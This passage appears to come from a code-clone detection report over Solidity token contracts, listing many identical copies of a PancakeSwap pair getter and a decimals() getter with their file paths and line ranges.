        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="48" endline="50" pcid="513">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="47" endline="49" pcid="5072">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="46" endline="48" pcid="3319">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="52" endline="54" pcid="6194">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="50" endline="52" pcid="2429">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="47" endline="49" pcid="1543">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="49" endline="51" pcid="4852">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="49" endline="51" pcid="8209">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="49" endline="51" pcid="9038">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="50" endline="52" pcid="325">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="48" endline="50" pcid="5350">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="60" endline="62" pcid="7723">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="44" endline="46" pcid="3722">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="49" endline="51" pcid="3173">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="50" endline="52" pcid="869">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="50" endline="52" pcid="4427">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="48" endline="50" pcid="2862">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="50" endline="52" pcid="1909">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="51" endline="53" pcid="4235">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="50" endline="52" pcid="7571">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="51" endline="53" pcid="6788">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="45" endline="47" pcid="5669">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="46" endline="48" pcid="3879">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="50" endline="52" pcid="4327">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="47" endline="49" pcid="5920">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="43" endline="45" pcid="6905">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="48" endline="50" pcid="6329">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="666" endline="668" pcid="4087">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="47" endline="49" pcid="7497">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="51" endline="53" pcid="4342">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="46" endline="48" pcid="7145">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="666" endline="668" pcid="8071">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="46" endline="48" pcid="8777">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="46" endline="48" pcid="91">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="46" endline="48" pcid="7616">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="47" endline="49" pcid="8579">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="49" endline="51" pcid="222">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="52" endline="54" pcid="1860">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="48" endline="50" pcid="428">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="50" endline="52" pcid="7969">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="46" endline="48" pcid="7646">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="50" endline="52" pcid="7586">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="48" endline="50" pcid="4102">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="50" endline="52" pcid="4220">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="47" endline="49" pcid="4382">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="43" endline="45" pcid="2228">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="47" endline="49" pcid="5525">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="47" endline="49" pcid="6805">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="47" endline="49" pcid="6030">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="48" endline="50" pcid="8419">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="48" endline="50" pcid="6244">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="52" endline="54" pcid="7336">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="47" endline="49" pcid="8374">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="49" endline="51" pcid="2179">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="50" endline="52" pcid="7062">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="50" endline="52" pcid="5555">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="48" endline="50" pcid="2937">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="47" endline="49" pcid="2760">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="46" endline="48" pcid="6130">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="45" endline="47" pcid="3784">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="49" endline="51" pcid="8792">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="48" endline="50" pcid="3544">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="50" endline="52" pcid="155">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="49" endline="51" pcid="7467">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="49" endline="51" pcid="5905">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="47" endline="49" pcid="9053">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="46" endline="48" pcid="6980">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="49" endline="51" pcid="5313">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="46" endline="48" pcid="6015">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="50" endline="52" pcid="2832">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="48" endline="50" pcid="1178">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="50" endline="52" pcid="674">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="49" endline="51" pcid="120">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="52" endline="54" pcid="2194">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="51" endline="53" pcid="7245">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="48" endline="50" pcid="6421">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="49" endline="51" pcid="6160">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="49" endline="51" pcid="1000">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="47" endline="49" pcid="3466">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="50" endline="52" pcid="3481">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="50" endline="52" pcid="6965">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="46" endline="48" pcid="7830">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="46" endline="48" pcid="9202">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="47" endline="49" pcid="4686">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="48" endline="50" pcid="7452">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="45" endline="47" pcid="7738">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="47" endline="49" pcid="1254">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="46" endline="48" pcid="5714">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="101" endline="103" pcid="2153">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="50" endline="52" pcid="1239">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="51" endline="53" pcid="2459">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="50" endline="52" pcid="3083">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="50" endline="52" pcid="2090">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="46" endline="48" pcid="3900">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="47" endline="49" pcid="4312">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="47" endline="49" pcid="8329">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="50" endline="52" pcid="7799">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="46" endline="48" pcid="4297">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="49" endline="51" pcid="5262">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="46" endline="48" pcid="4837">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="50" endline="52" pcid="1879">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="49" endline="51" pcid="1944">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="48" endline="50" pcid="2780">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="89" endline="91" pcid="4920">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="47" endline="49" pcid="6935">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="47" endline="49" pcid="8546">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="48" endline="50" pcid="2535">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="50" endline="52" pcid="6638">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="46" endline="48" pcid="8687">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="47" endline="49" pcid="829">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="48" endline="50" pcid="61">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="50" endline="52" pcid="3559">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="47" endline="49" pcid="6680">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
</class>

<class classid="36" nclones="495" nlines="3" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="64" endline="66" pcid="49">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="55" endline="57" pcid="1624">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="60" endline="62" pcid="6247">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="59" endline="61" pcid="4689">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="61" endline="63" pcid="939">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="57" endline="59" pcid="8032">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="58" endline="60" pcid="8181">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="57" endline="59" pcid="4283">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="58" endline="60" pcid="7148">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="122" endline="124" pcid="3512">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="42" endline="44" pcid="784">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="65" endline="67" pcid="401">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
